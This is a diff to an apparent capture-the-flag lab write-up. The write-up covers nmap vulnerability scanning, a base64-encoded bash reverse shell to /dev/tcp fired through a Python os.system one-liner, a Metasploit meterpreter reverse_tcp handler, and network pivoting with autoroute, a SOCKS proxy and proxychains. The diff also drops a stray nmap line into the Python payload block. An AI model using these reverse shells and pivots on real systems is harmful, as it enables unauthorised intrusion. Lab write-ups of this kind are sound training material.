@@ -7,6 +7,10 @@
 
 ### RECON
 
+```
+nmap -A --script vuln -p- 192.32.59.2
+```
+
 **OPEN PORTS**:<br>
 80 http (Apache 2.4.29 Web Server),<br>
 5000 http,<br>
@@ -78,13 +82,8 @@ echo "bash -c 'bash -i >& /dev/tcp/192.32.59.2/1234 0>&1'" | base64
 Final python script
 ```
 __import__('os').system("echo YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMzIuNTkuMi8xMjM0IDA+JjEnCg== | base64 -d | bash")
+nmap -A --script vuln -p- 1
 ```
-
-### GETTING FLAG 1
-```
-find / -iname *flag* 2>/dev/null
-```
-
 /tmp/flag
 
 **FLAG**: 3b2b474c06380f696b38c1498f795e054374
@@ -112,9 +111,9 @@ Set up payload handler in metasploit
 ```
 msfconsole
 use exploit/multi/handler
-set payload linux/x64/meterpreter/reverse_tcp
-set lhost 192.32.59.2
-set lport 4444
+set PAYLOAD linux/x64/meterpreter/reverse_tcp
+set LHOST 192.32.59.2
+set LPORT 4444
 exploit
 
 Execute payload
@@ -130,7 +129,7 @@ Run port scan on other network
 run autoroute -s 192.244.194.0/24
 background
 use auxiliary/scanner/portscan/tcp 
-set rhosts 192.244.194.0/24
+set RHOSTS 192.244.194.0/24
 run
 ```
 
@@ -149,8 +148,8 @@ SERVICE: http (Jetty 9.4.27)
 Start proxy server to access website
 ```
 use auxiliary/server/socks_proxy
-set srvport 9050 #Default port for proxychains
-set version 4a
+set SRVPORT 9050 #Default port for proxychains
+set VERSION 4a
 run
 proxychains nmap -sT -P0 192.244.194.3 #Proxies don't support ping so have to use -P0
 ```
@@ -180,3 +179,4 @@ Connect to the server
 ```
 nc -v 192.244.194.3 6666
 ```
+
